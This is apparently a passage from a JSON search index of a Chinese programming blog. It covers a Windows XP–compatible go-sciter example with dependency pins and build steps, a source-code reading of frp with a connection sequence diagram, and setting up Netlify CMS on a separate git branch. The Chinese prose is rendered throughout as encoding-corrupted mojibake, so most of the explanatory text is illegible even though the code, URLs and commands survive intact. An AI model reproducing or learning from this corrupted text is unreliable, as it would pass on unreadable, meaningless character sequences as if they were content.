style=\"color:#ae81ff\"\u003e${{ secrets.GITHUB_TOKEN }}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e","title":"ä½¿ç”¨zigåœ¨linuxä¸Šäº¤å‰ç¼–è¯‘cgo"},{"content":"ç°åœ¨çš„ https://github.com/sciter-sdk/go-sciter é¡¹ç›®æƒ³è¦å…¼å®¹ xp å·²ç»ååˆ†å›°éš¾\næˆ‘å†™äº†ä¸€ä¸ªä¾‹å­ï¼Œåœ°å€åœ¨ https://github.com/akkuman/go-sciter-xpï¼Œ æ—¨åœ¨æä¾›ä¸€ä¸ªå…¼å®¹ xp çš„ go-sciter æ ·ä¾‹ã€‚\næ„Ÿå…´è¶£çš„å¯ä»¥å°†é¡¹ç›®å…‹éš†ä¸‹æ¥åè¿›è¡Œè‡ªå·±çš„å¼€å‘\nç¯å¢ƒä¾èµ– go 1.10 https://github.com/golang/dep å·¥å…· sciter-sdk 4.4.4.7 å…³äºç¯å¢ƒçš„è¯´æ˜ ä¸Šé¢å‡ ä¸ªç¯å¢ƒåŠ¡å¿…ä¿æŒç›¸åŒ\nsciter-sdk ä¸ºä»€ä¹ˆä½¿ç”¨ 4.4.4.7 ç‰ˆæœ¬ æˆ‘ä½¿ç”¨ rundll32 åœ¨ xp ä¸Šè°ƒç”¨ sciter.dllï¼Œæœ€é«˜åªèƒ½æ”¯æŒåˆ°è¿™ä¸ªç‰ˆæœ¬\næˆ‘å·²ç»å°†è¿™ä¸ªç‰ˆæœ¬çš„ dll æ”¾åˆ°æœ¬ä»“åº“äº†\nsciter-4.4.4.7-normal.dll æ¥è‡ª https://github.com/c-smile/sciter-sdk/tree/c7d48627e8716bb803bebf2c74f54ab2dd0d7c51/bin.win/x32 sciter-4.4.4.7-skia.dll æ¥è‡ª https://github.com/c-smile/sciter-sdk/tree/c7d48627e8716bb803bebf2c74f54ab2dd0d7c51/bin.win/x32skia è¿™ä¸¤ä¸ªç‰ˆæœ¬çš„åŒºåˆ«æ˜¯ï¼Œskia ä½¿ç”¨ skia è¿›è¡Œæ¸²æŸ“ï¼Œå¹¶ä¸”ä½“ç§¯å¤§ä¸€äº›\nä¸ºä»€ä¹ˆä½¿ç”¨ go1.10 æ ¹æ® https://github.com/golang/go/issues/23380 ï¼Œgolang version 1.10 æ˜¯æœ€åä¸€ä¸ªæ”¯æŒxpçš„ç‰ˆæœ¬ï¼Œåç»­çš„ç‰ˆæœ¬ä¸å¯¹å…¼å®¹æ€§åšä¿è¯\nå…³äºguiåº“\ngovcl: go ver\u0026gt;=1.9.2 : ä¼˜åŠ¿ï¼š å¯ä»¥ä½¿ç”¨lazarusæˆ–delphiç­‰ç•Œé¢è®¾è®¡è½¯ä»¶ç›´æ¥ç”»ç•Œé¢ go-sciter: go ver\u0026gt;=1.10ï¼šä¼˜åŠ¿ï¼šä½¿ç”¨äº†å®Œæ•´çš„webæŠ€æœ¯æ ˆï¼Œä½†æ˜¯è‚¯å®šä¸èƒ½ä¸æµè§ˆå™¨çš„å…¼å®¹æ€§ç›¸æ¯”ï¼Œä¸è¿‡å†™ç•Œé¢åº”è¯¥æ˜¯å¤Ÿäº†ï¼Œç›®å‰ä½¿ç”¨sciterçš„æ˜æ˜Ÿäº§å“ï¼šrustdesk gotk3ï¼šgo ver\u0026gt;=1.8 gtkç»‘å®š qtï¼šæ”¯æŒ1.10ï¼Œä½†æ˜¯å®‰è£…è¾ƒä¸ºå¤æ‚ è€ƒè™‘åˆ°ç¾è§‚å’Œå…¼å®¹çš„é—®é¢˜ï¼Œå»ºè®®ä½¿ç”¨ go-sciter\næ³¨æ„ï¼Œgo1.10ä¸æ”¯æŒgo moduleï¼Œéœ€è¦ä½¿ç”¨gopathçš„æ¨¡å¼\nä¸ºä»€ä¹ˆä½¿ç”¨dep dep å·²ç»æ˜¯ä¸€ä¸ªä¸å†ç»´æŠ¤çš„ä¸œè¥¿ï¼Œå·²ç»è¢« go module å–ä»£ï¼Œä½†æ˜¯ module åˆ° go1.13 æ‰æœ‰æ”¯æŒï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ dep\næ–‡ä»¶è¯·æŸ¥çœ‹ Gopkg.toml\nå…³äº Gopkg.toml çš„è§£é‡Š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 [[constraint]] # åç»­çš„ç‰ˆæœ¬åˆå¹¶äº†æ–°ç‰ˆapiï¼ˆ4.4.7.0+ï¼‰ï¼Œxpå¯ç”¨çš„sciter-sdkç‰ˆæœ¬æœ€é«˜åˆ° 4.4.4.7ï¼ˆhttps://github.com/c-smile/sciter-sdk/commit/c7d48627e8716bb803bebf2c74f54ab2dd0d7c51ï¼‰ # è§ https://github.com/sciter-sdk/go-sciter/issues/297 ä¸ https://github.com/sciter-sdk/go-sciter/commit/99cd4de65a26163ff93872ef7bba888b479081dc # æ‰€ä»¥éœ€è¦é™ç‰ˆæœ¬ revision = \u0026#34;a04e052a28133d8a79c82b53fc861d1e473c0499\u0026#34; name = \u0026#34;github.com/sciter-sdk/go-sciter\u0026#34; [[override]] branch = \u0026#34;master\u0026#34; name = \u0026#34;github.com/lxn/win\u0026#34; [[override]] # æ–°ç‰ˆä¼šæŠ¥é”™ shift count type int, must be unsigned integerï¼Œè§ shift count type int, must be unsigned integer # lxn/win ä¸­å¼•ç”¨äº† window.UTF16PtrToStringï¼Œæ‰€ä»¥ä¸èƒ½å¼•å…¥å¤ªè€çš„ç‰ˆæœ¬ï¼Œè§ https://github.com/golang/sys/blame/66a0560e4e097a54e439cdc529e28fcd0f9014e8/windows/syscall_windows.go branch = \u0026#34;internal-branch.go1.16-vendor\u0026#34; name = \u0026#34;golang.org/x/sys\u0026#34; [prune] go-tests = true # unused-packages = true unused-packages = true è¢«æ³¨é‡Šæ‰äº†ï¼Œä¸»è¦æ˜¯å› ä¸ºvendoré»˜è®¤ä¼šå°†ä¸åŒ…å«goæ–‡ä»¶çš„æ–‡ä»¶å¤¹å»é™¤ï¼Œè€Œgo-sciterä½¿ç”¨äº†cgoï¼Œå¹¶å°†å¤´æ–‡ä»¶å…¨éƒ¨æ”¾ç½®åˆ°äº†åŒä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œluuny è¿˜æäº†ä¸ª PRï¼Œä¸è¿‡ä½¿ç”¨depå¯ä»¥å¯¹æ­¤è¡Œä¸ºè¿›è¡Œæ§åˆ¶ï¼Œå°±ä¸éœ€è¦äº†ï¼Œdepçš„è¯¦ç»†ä½¿ç”¨è¯´æ˜å¯è§ https://blog.csdn.net/chenguolinblog/article/details/90665116 go-sciter æˆ‘æŒ‡å®šäº†ç‰¹å®šçš„commitï¼Œä¸»è¦æ˜¯å› ä¸ºapiçš„ç ´åæ€§æ›´æ–°ï¼Œå…·ä½“åŸå› è§æ³¨é‡Š golang.org/x/sys æˆ‘ override å¹¶æŒ‡å®šäº†ç‰¹å®šçš„åˆ†æ”¯ï¼Œä¸»è¦æ˜¯å› ä¸ºå­˜åœ¨ä¾èµ–å…³ç³» go-sciter -\u0026gt; lxn/win -\u0026gt; x/sys/windowsï¼Œä¸æŒ‡å®šä¼šé»˜è®¤ä½¿ç”¨ master åˆ†æ”¯ä¸Šçš„æœ€æ–°ç‰ˆæœ¬ï¼Œä¼šæŠ¥é”™ shift count type int, must be unsigned integerï¼Œä½†æ˜¯åˆä¸èƒ½ä½¿ç”¨å¤ªè€çš„ç‰ˆæœ¬ï¼Œå› ä¸º lxn/win ä¸­å¼•ç”¨äº† window.UTF16PtrToStringï¼Œæˆ‘æœå¯»äº†ä¸€ä¸‹ blameï¼Œæ‰¾åˆ°äº†ç¦» UTF16PtrToString æœ€è¿‘çš„åˆ†æ”¯ç‰ˆæœ¬ï¼Œä½ ä¹Ÿå¯ä»¥ç»§ç»­æµ‹è¯•æ›´æ”¹ç‰ˆæœ¬çš„åˆ†æ”¯ï¼Œæˆ‘åªæ˜¯æµ‹è¯•è¯¥ç‰ˆæœ¬æ— é—®é¢˜å°±ä½¿ç”¨äº† æ ·ä¾‹æ„å»ºè¯´æ˜ å®‰è£… go1.10 å…‹éš†è¯¥ä»“åº“åˆ° $GOPATH/src ä¸‹é¢ï¼ˆå°±æ˜¯gopathå¼€å‘æ¨¡å¼ï¼‰ æŒ‰ç…§ https://github.com/golang/dep ä¸­çš„è¯´æ˜å®‰è£… dep ä½¿ç”¨å‘½ä»¤ dep ensure åˆå§‹åŒ– vendor ä½¿ç”¨å‘½ä»¤ go build -ldflags=\u0026quot;-H windowsgui\u0026quot; è¿›è¡Œæ„å»ºï¼ˆç¯å¢ƒå˜é‡ GOARCH=386ï¼‰ï¼Œæ³¨æ„ï¼šéœ€è¦æ‰‹åŠ¨æŒ‡å®š32ä½çš„ç¼–è¯‘å™¨ï¼ˆå³ä¿®æ”¹CCå’ŒCXXï¼Œæˆ‘çš„ä¾‹å­ä¸­æˆ‘ä½¿ç”¨ CC=D:\\Applications\\Soft\\mingw32\\bin\\gcc;CXX=D:\\Applications\\Soft\\mingw32\\bin\\g++ï¼‰ å°† sciter-4.4.4.7-normal.dll æˆ– sciter-4.4.4.7-skia.dll æ›´åä¸º sciter.dllï¼Œè¿è¡Œexeå³å¯ æˆªå›¾ ","permalink":"https://www.hacktech.cn/post/go-sciter-xp.html","summary":"\u003cp\u003eç°åœ¨çš„ \u003ca href=\"https://github.com/sciter-sdk/go-sciter\"\u003ehttps://github.com/sciter-sdk/go-sciter\u003c/a\u003e é¡¹ç›®æƒ³è¦å…¼å®¹ xp å·²ç»ååˆ†å›°éš¾\u003c/p\u003e\n\u003cp\u003eæˆ‘å†™äº†ä¸€ä¸ªä¾‹å­ï¼Œåœ°å€åœ¨ \u003ca href=\"https://github.com/akkuman/go-sciter-xp\"\u003ehttps://github.com/akkuman/go-sciter-xp\u003c/a\u003eï¼Œ æ—¨åœ¨æä¾›ä¸€ä¸ªå…¼å®¹ xp çš„ go-sciter æ ·ä¾‹ã€‚\u003c/p\u003e\n\u003cp\u003eæ„Ÿå…´è¶£çš„å¯ä»¥å°†é¡¹ç›®å…‹éš†ä¸‹æ¥åè¿›è¡Œè‡ªå·±çš„å¼€å‘\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"ç¯å¢ƒä¾èµ–\"\u003eç¯å¢ƒä¾èµ–\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003ego 1.10\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/golang/dep\"\u003ehttps://github.com/golang/dep\u003c/a\u003e å·¥å…·\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/c-smile/sciter-sdk/tree/c7d48627e8716bb803bebf2c74f54ab2dd0d7c51\"\u003esciter-sdk 4.4.4.7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"å…³äºç¯å¢ƒçš„è¯´æ˜\"\u003eå…³äºç¯å¢ƒçš„è¯´æ˜\u003c/h3\u003e\n\u003cp\u003eä¸Šé¢å‡ ä¸ªç¯å¢ƒåŠ¡å¿…ä¿æŒç›¸åŒ\u003c/p\u003e\n\u003ch4 id=\"sciter-sdk-ä¸ºä»€ä¹ˆä½¿ç”¨-4447-ç‰ˆæœ¬\"\u003esciter-sdk ä¸ºä»€ä¹ˆä½¿ç”¨ 4.4.4.7 ç‰ˆæœ¬\u003c/h4\u003e\n\u003cp\u003eæˆ‘ä½¿ç”¨ rundll32 åœ¨ xp ä¸Šè°ƒç”¨ sciter.dllï¼Œæœ€é«˜åªèƒ½æ”¯æŒåˆ°è¿™ä¸ªç‰ˆæœ¬\u003c/p\u003e\n\u003cp\u003eæˆ‘å·²ç»å°†è¿™ä¸ªç‰ˆæœ¬çš„ dll æ”¾åˆ°æœ¬ä»“åº“äº†\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/akkuman/go-sciter-xp/blob/master/sciter-4.4.4.7-normal.dll\"\u003esciter-4.4.4.7-normal.dll\u003c/a\u003e æ¥è‡ª \u003ca href=\"https://github.com/c-smile/sciter-sdk/tree/c7d48627e8716bb803bebf2c74f54ab2dd0d7c51/bin.win/x32\"\u003ehttps://github.com/c-smile/sciter-sdk/tree/c7d48627e8716bb803bebf2c74f54ab2dd0d7c51/bin.win/x32\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/akkuman/go-sciter-xp/blob/master/sciter-4.4.4.7-skia.dll\"\u003esciter-4.4.4.7-skia.dll\u003c/a\u003e æ¥è‡ª \u003ca href=\"https://github.com/c-smile/sciter-sdk/tree/c7d48627e8716bb803bebf2c74f54ab2dd0d7c51/bin.win/x32skia\"\u003ehttps://github.com/c-smile/sciter-sdk/tree/c7d48627e8716bb803bebf2c74f54ab2dd0d7c51/bin.win/x32skia\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eè¿™ä¸¤ä¸ªç‰ˆæœ¬çš„åŒºåˆ«æ˜¯ï¼Œskia ä½¿ç”¨ skia è¿›è¡Œæ¸²æŸ“ï¼Œå¹¶ä¸”ä½“ç§¯å¤§ä¸€äº›\u003c/p\u003e\n\u003ch4 id=\"ä¸ºä»€ä¹ˆä½¿ç”¨-go110\"\u003eä¸ºä»€ä¹ˆä½¿ç”¨ go1.10\u003c/h4\u003e\n\u003cp\u003eæ ¹æ® \u003ca href=\"https://github.com/golang/go/issues/23380\"\u003ehttps://github.com/golang/go/issues/23380\u003c/a\u003e ï¼Œgolang version 1.10 æ˜¯æœ€åä¸€ä¸ªæ”¯æŒxpçš„ç‰ˆæœ¬ï¼Œåç»­çš„ç‰ˆæœ¬ä¸å¯¹å…¼å®¹æ€§åšä¿è¯\u003c/p\u003e\n\u003cp\u003eå…³äºguiåº“\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003egovcl: go ver\u0026gt;=1.9.2 : ä¼˜åŠ¿ï¼š å¯ä»¥ä½¿ç”¨lazarusæˆ–delphiç­‰ç•Œé¢è®¾è®¡è½¯ä»¶ç›´æ¥ç”»ç•Œé¢\u003c/li\u003e\n\u003cli\u003ego-sciter: go ver\u0026gt;=1.10ï¼šä¼˜åŠ¿ï¼šä½¿ç”¨äº†å®Œæ•´çš„webæŠ€æœ¯æ ˆï¼Œä½†æ˜¯è‚¯å®šä¸èƒ½ä¸æµè§ˆå™¨çš„å…¼å®¹æ€§ç›¸æ¯”ï¼Œä¸è¿‡å†™ç•Œé¢åº”è¯¥æ˜¯å¤Ÿäº†ï¼Œç›®å‰ä½¿ç”¨sciterçš„æ˜æ˜Ÿäº§å“ï¼šrustdesk\u003c/li\u003e\n\u003cli\u003egotk3ï¼šgo ver\u0026gt;=1.8 gtkç»‘å®š\u003c/li\u003e\n\u003cli\u003eqtï¼šæ”¯æŒ1.10ï¼Œä½†æ˜¯å®‰è£…è¾ƒä¸ºå¤æ‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eè€ƒè™‘åˆ°ç¾è§‚å’Œå…¼å®¹çš„é—®é¢˜ï¼Œå»ºè®®ä½¿ç”¨ go-sciter\u003c/p\u003e\n\u003cp\u003eæ³¨æ„ï¼Œgo1.10ä¸æ”¯æŒgo moduleï¼Œéœ€è¦ä½¿ç”¨gopathçš„æ¨¡å¼\u003c/p\u003e\n\u003ch4 id=\"ä¸ºä»€ä¹ˆä½¿ç”¨dep\"\u003eä¸ºä»€ä¹ˆä½¿ç”¨dep\u003c/h4\u003e\n\u003cp\u003edep å·²ç»æ˜¯ä¸€ä¸ªä¸å†ç»´æŠ¤çš„ä¸œè¥¿ï¼Œå·²ç»è¢« go module å–ä»£ï¼Œä½†æ˜¯ module åˆ° go1.13 æ‰æœ‰æ”¯æŒï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ dep\u003c/p\u003e","title":"xp å…¼å®¹çš„ go-sciter"},{"content":"é¦–å…ˆæ ¹æ®æºç æ¢³ç†å‡ºæ—¶åºå›¾\nsequenceDiagram actor u as user participant s as server participant c as client loop ç›´åˆ°ç™»å½•æˆåŠŸ c -\u003e\u003e + s : login s --\u003e\u003e - c : version+runid+udpport+err end loop å¿ƒè·³ c -) + s : å¿ƒè·³ping s --) - c : å¿ƒè·³pong end activate s s -) c : å‘é€ ReqWorkConn æ¶ˆæ¯ï¼Œæ ¹æ®è¿æ¥æ± é…ç½®å»ºç«‹è¿æ¥ c --\u003e\u003e s : å»ºç«‹è¿æ¥ï¼Œå‘é€ NewWorkConn æ¶ˆæ¯ï¼Œå¸¦ä¸Šrunid s -\u003e\u003e s: å°†è¿æ¥æ”¾å…¥runidå¯¹åº”çš„è¿æ¥æ±  deactivate s c -) + s : æ ¹æ® client proxy é…ç½®ï¼Œå‘é€ NewProxy è¯·æ±‚ s -\u003e\u003e s : å¯åŠ¨proxy(ç›‘å¬proxyå¯¹åº”çš„ç«¯å£) s --\u003e\u003e - c : å›å¤ NewProxyResp æ¶ˆæ¯(å¸¦å…¥proxyName)\tu -\u003e\u003e + s : è®¿é—® proxy ç›‘å¬çš„ç«¯å£ s -\u003e\u003e s : å°†ç”¨æˆ·è¯·æ±‚ä¸ client è¿æ¥æ± ä¸­çš„ä¸€ä¸ªå¯ç”¨è¿æ¥ä¸²è”èµ·æ¥ s -) c : åœ¨ä¸Šè¿°å¯ç”¨è¿æ¥ä¸Šå‘é€ StartWorkConn æ¶ˆæ¯ï¼Œå‘ŠçŸ¥æœ‰æ–°çš„ç”¨æˆ·è¿æ¥æ¥å…¥è¯¥ proxy c -\u003e\u003e c : å¤„ç†è¯¥è¿æ¥ frpä¸­ client å’Œ server ä¹‹é—´çš„è¿æ¥æœ‰ workConn å’Œæ™®é€šè¿æ¥ä¸¤ç±»ï¼ŒworkConn ä¸»è¦æ˜¯ä¸ºäº†å’Œç”¨æˆ·ä¸»åŠ¨å‘èµ·çš„è¿æ¥æ‰“é€šï¼Œè€Œæ™®é€šè¿æ¥ä¸»è¦æ˜¯ client ä¸ server ä¹‹é—´çš„ä¸šåŠ¡äº¤æµ\næ™®é€šè¿æ¥å»ºç«‹åï¼Œç”± server ä¸‹å‘æŒ‡ä»¤ç»™ clientï¼Œè®© client ä¸»åŠ¨ä¸ server å»ºç«‹æ–°çš„ workConnï¼Œserver ä¼šæ ¹æ® runid å°†è¿™äº›è¿æ¥æ”¾å…¥è¯¥ client ä¸“æœ‰çš„ workConn è¿æ¥æ± ä¸­ï¼Œè¿™äº› workConn ä¼šç­‰å¾…åç»­çš„ StartWorkConn æŒ‡ä»¤\nclient ä¼šé€šè¿‡æ™®é€šè¿æ¥ï¼Œå‘ŠçŸ¥ server éœ€è¦å¯åŠ¨ proxyï¼Œç„¶å server ç«¯ä¼šæ ¹æ® client ä¼ é€’è¿‡æ¥çš„ proxy é…ç½®æ¥è¿›è¡Œç«¯å£ç›‘å¬ï¼Œå¦‚æœè¯¥ç«¯å£ä¸Šç›‘å¬åˆ°ç”¨æˆ·è¯·æ±‚ï¼Œä¼šä» workConn è¿æ¥æ± ä¸­å–å‡ºä¸€ä¸ªå¯ç”¨è¿æ¥ï¼Œå¹¶ç»™ client å‘é€ StartWorkConn æŒ‡ä»¤ï¼ˆå…¶å®è¿™ä¸¤æ­¥æ˜¯ä¸€èµ·çš„ï¼Œå› ä¸ºtcpçš„æ€§è´¨ï¼Œå¦‚æœä½ ä¸å‘é€æ•°æ®ï¼Œå°±æ— æ³•åˆ¤æ–­è¯¥è¿æ¥æ˜¯å¦è¿˜å¯ç”¨ï¼‰ï¼Œå‘ŠçŸ¥æœ‰æ–°çš„ç”¨æˆ·è¿æ¥æ¥å…¥è¯¥ proxy\nclient åœ¨ workConn æ¥æ”¶åˆ° StartWorkConn æŒ‡ä»¤åï¼Œå°†ä¼šæ ¹æ® proxy é…ç½®æ¥å¤„ç† workConnï¼Œåç»­çš„ ç”¨æˆ·-server-client ä¹‹é—´çš„æ•°æ®å°†è¢«ä¸²è”èµ·æ¥ã€‚\nfrpæ•´ä½“é‡‡ç”¨äº†channelæ¥å¤„ç†è¿æ¥çš„æ•°æ®ä¼ è¾“ï¼Œæ‰€ä»¥æ•´ä½“æµç¨‹ä»ä»£ç ä¸Šæ˜¯å¾ˆå‰²è£‚çš„ï¼Œéœ€è¦æœ‰è€å¿ƒåœ°é˜…è¯»ã€‚\nå…¶å®frpè¿˜æœ‰å¾ˆå¤šåŠŸèƒ½ï¼Œä½†æ˜¯å¹¶ä¸å½±å“ä¸»æµç¨‹çš„ç†è§£ï¼Œæ­¤å¤„ä¸ä¸€ä¸€å±•å¼€äº†ã€‚\næºç é˜…è¯»æ³¨é‡Šå¯æŸ¥çœ‹ https://github.com/akkuman/readsource-frp-3e721d1/compare/98e0b93\u0026hellip;master\n","permalink":"https://www.hacktech.cn/post/frp-source-read.html","summary":"\u003cp\u003eé¦–å…ˆæ ¹æ®æºç æ¢³ç†å‡ºæ—¶åºå›¾\u003c/p\u003e\n\u003cdiv class=\"mermaid\"\u003esequenceDiagram\n\tactor u as user\n\tparticipant s as server\n\tparticipant c as client\n\tloop ç›´åˆ°ç™»å½•æˆåŠŸ\n\t\tc -\u003e\u003e + s : login\n\t\ts --\u003e\u003e - c : version+runid+udpport+err\n\tend\n\tloop å¿ƒè·³\n\t\tc -) + s : å¿ƒè·³ping\n\t\ts --) - c : å¿ƒè·³pong\n\tend\n\n    activate s\n\ts -) c : å‘é€ ReqWorkConn æ¶ˆæ¯ï¼Œæ ¹æ®è¿æ¥æ± é…ç½®å»ºç«‹è¿æ¥\n\tc --\u003e\u003e s : å»ºç«‹è¿æ¥ï¼Œå‘é€ NewWorkConn æ¶ˆæ¯ï¼Œå¸¦ä¸Šrunid\n\ts -\u003e\u003e s: å°†è¿æ¥æ”¾å…¥runidå¯¹åº”çš„è¿æ¥æ± \n    deactivate s\n\n\tc -) + s : æ ¹æ® client proxy é…ç½®ï¼Œå‘é€ NewProxy è¯·æ±‚\n\ts -\u003e\u003e s : å¯åŠ¨proxy(ç›‘å¬proxyå¯¹åº”çš„ç«¯å£)\n\ts --\u003e\u003e - c : å›å¤ NewProxyResp æ¶ˆæ¯(å¸¦å…¥proxyName)\t\n\n\tu -\u003e\u003e + s : è®¿é—® proxy ç›‘å¬çš„ç«¯å£\n\ts -\u003e\u003e s : å°†ç”¨æˆ·è¯·æ±‚ä¸ client è¿æ¥æ± ä¸­çš„ä¸€ä¸ªå¯ç”¨è¿æ¥ä¸²è”èµ·æ¥\n\ts -) c : åœ¨ä¸Šè¿°å¯ç”¨è¿æ¥ä¸Šå‘é€ StartWorkConn æ¶ˆæ¯ï¼Œå‘ŠçŸ¥æœ‰æ–°çš„ç”¨æˆ·è¿æ¥æ¥å…¥è¯¥ proxy\n\tc -\u003e\u003e c : å¤„ç†è¯¥è¿æ¥\n\u003c/div\u003e\n\u003cp\u003efrpä¸­ client å’Œ server ä¹‹é—´çš„è¿æ¥æœ‰ workConn å’Œæ™®é€šè¿æ¥ä¸¤ç±»ï¼ŒworkConn ä¸»è¦æ˜¯ä¸ºäº†å’Œç”¨æˆ·ä¸»åŠ¨å‘èµ·çš„è¿æ¥æ‰“é€šï¼Œè€Œæ™®é€šè¿æ¥ä¸»è¦æ˜¯ client ä¸ server ä¹‹é—´çš„ä¸šåŠ¡äº¤æµ\u003c/p\u003e","title":"frp æºç é˜…è¯»"},{"content":"ç½‘ä¸Šçš„åšå®¢å¾ˆå¤šå…³äºNetlify CMSçš„éƒ¨ç½²éƒ½æ˜¯ä½¿ç”¨äº†Netlifyçš„æœåŠ¡ï¼Œå› ä¸ºæˆ‘è‡ªå·±çš„åšå®¢å·²ç»ä½¿ç”¨äº†GithubActionä½œä¸ºCIæ¥è‡ªåŠ¨éƒ¨ç½²ï¼Œæˆ‘çš„åšå®¢æºæ–‡ä»¶æ”¾åœ¨hugoåˆ†æ”¯ä¸‹ï¼Œå¯¹hugoåˆ†æ”¯commitä¼šè§¦å‘GithubActionï¼Œç„¶åä½¿ç”¨è¿›è¡Œç½‘ç«™æ„å»ºå¹¶æ¨é€åˆ°masteråˆ†æ”¯ä¸‹ï¼Œå¹¶ä¸”è‡ªå®šä¹‰åŸŸåæ˜¯ä½¿ç”¨çš„å…¶ä»–åŸŸåæä¾›å•†æ¥è§£æçš„ï¼Œæœ¬æ–‡ä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹åœ¨è¿™ç§æƒ…å†µä¸‹æ€ä¹ˆä¸ºåšå®¢æ·»åŠ NetlifyCMS\nNetlify CMS åšä»€ä¹ˆ å®‰è£…ä¹‹å‰æˆ‘ä»¬éœ€è¦äº†è§£ä¸€ä¸‹Netlify CMSæ˜¯ä»€ä¹ˆã€‚Netlify CMS å’Œ Forestry ç­‰å·¥å…·ä¸€æ ·ï¼Œå®ƒå¯ä»¥å¸®åŠ©ä½ ç®¡ç†ä½ çš„gitä»“åº“ï¼Œæˆ‘ä»¬ä¸€èˆ¬çš„ä¸»è¦ç”¨é€”å°±æ˜¯æ‹¿å®ƒæ¥ç®¡ç†gitä»“åº“ä¸­çš„ blog æºæ–‡ä»¶ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªå‹å¥½çš„ç•Œé¢æ¥å¸®åŠ©ä½ ç¼–å†™ä½ çš„ blog æºæ–‡ä»¶ï¼Œç„¶ååç»­çš„ git commit push å®ƒä¼šå¸®ä½ æ•ˆåŠ³ï¼Œä½ å¯ä»¥æ‹¿å®ƒæ¥ä½œä¸ºCIï¼Œè‡ªåŠ¨å¸®ä½ æ„å»ºå¥½ç½‘ç«™ï¼Œä¹Ÿå¯ä»¥åªä½¿ç”¨ä»–çš„ç¼–è¾‘æ¨é€åŠŸèƒ½ï¼ŒæŠŠå®ƒå½“ä½œä¸€ä¸ªç®¡ç†åå°ï¼Œè®©å…¶ä»–çš„CIæ¥å¸®ä½ åšåé¢çš„äº‹æƒ…ã€‚\nä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘æœ‰ä¸€ä¸ªåšå®¢æ‰˜ç®¡åœ¨ github pagesï¼Œæ‹¥æœ‰è‡ªå·±çš„CIæ¥è¿›è¡Œåšå®¢éƒ¨ç½²ï¼Œæˆ‘åªéœ€è¦æ¨é€ markdown åšæ–‡æºæ–‡ä»¶åˆ°æŒ‡å®šåˆ†æ”¯ä¸‹ï¼Œå³å¯è§¦å‘æ„å»ºï¼Œä½†æ˜¯æˆ‘ä¸æƒ³æ¯æ¬¡éƒ½åœ¨æœ¬åœ°å†™åšå®¢ï¼Œæˆ‘å¸Œæœ›æœ‰ä¸ªç®€å•çš„æ–¹å¼æ¥è®©æˆ‘éšæ—¶éšåœ°åœ¨çº¿ç¼–è¾‘å‘å¸ƒåšå®¢ï¼Œé‚£æˆ‘å°±å¯ä»¥ä½¿ç”¨ Netlify CMSï¼Œå½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ github.devï¼Œä¸è¿‡ç¼ºç‚¹æ˜¯ä½ éœ€è¦å¦å¤–çš„å·¥å…·æ¥å¤„ç†ä½ çš„å›¾ç‰‡ï¼Œå› ä¸º github.dev ä¸æ”¯æŒå›¾ç‰‡ç²˜è´´ï¼ˆç›¸åº”çš„æ’ä»¶ä¹Ÿæ— æ³•å®‰è£…ï¼‰ï¼Œä½†æ˜¯ Netlify CMS èƒ½å¤Ÿé€šè¿‡é…ç½®æ¥å®Œæˆç²˜è´´å›¾ç‰‡çš„åŠŸèƒ½ï¼Œéº»é›€è™½å°äº”è„ä¿±å…¨ã€‚\nå¦‚ä½•éƒ¨ç½² å¯èƒ½ä½ çœ‹äº†ä¸å°‘è¯´æ˜æ–‡æ¡£ï¼Œä½†æ˜¯è¿˜æ˜¯å¤„äºä¸å¯ç”¨çš„çŠ¶æ€ã€‚å…¶å®æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†åŸå› æ˜¯æ²¡æœ‰ä½¿ç”¨ Netlify çš„æœåŠ¡ï¼Œæ¯”å¦‚ä½ çš„è‡ªå®šä¹‰åŸŸåæ²¡æœ‰æ‰˜ç®¡åœ¨ Netlifyã€‚\næˆ‘å†³å®šä½¿ç”¨ Netlfify æä¾›ç»™æˆ‘çš„ xxxx.netlify.app åŸŸåã€‚æœ€ç»ˆæ•ˆæœæ˜¯æˆ‘å¯ä»¥ç›´æ¥è®¿é—®è¯¥åŸŸå(xxxx.netlify.app) å³å¯ç®¡ç†æˆ‘çš„åšå®¢åå°ã€‚\nå»ºç«‹æ–°åˆ†æ”¯ ä»è¿™é‡Œå¼€å§‹å¯èƒ½ä½ å°±ä¼šå‘ç°å’Œè¯´æ˜æ–‡æ¡£æœ‰ç‚¹ä¸ä¸€æ ·ã€‚å› ä¸ºæˆ‘ä¸æ‰“ç®—æŠŠå®ƒæ”¾ç½®åœ¨å­æ–‡ä»¶å¤¹ï¼ˆadminï¼‰ä¸‹ã€‚\né¦–å…ˆæˆ‘ä»¬ clone æˆ‘ä»¬çš„åšå®¢ä»“åº“ã€‚æ‹¿æˆ‘è‡ªå·±çš„ä»“åº“ä¸¾ä¾‹å­ï¼Œhugo æ˜¯æˆ‘æ”¾ç½®åšå®¢æºæ–‡ä»¶çš„åˆ†æ”¯ã€‚\n1 2 git clone git@github.com:akkuman/akkuman.github.io.git cd akkuman.github.io ç„¶åæˆ‘ä»¬æ–°å»ºä¸€ä¸ªåˆ†æ”¯ç”¨æ¥æ‰˜ç®¡ Netlify CMSã€‚\n1 2 git checkout --orphan netlifycms # æ–°å»ºä¸€ä¸ªæ²¡æœ‰å†å²çš„åˆ†æ”¯ git rm -rf . # 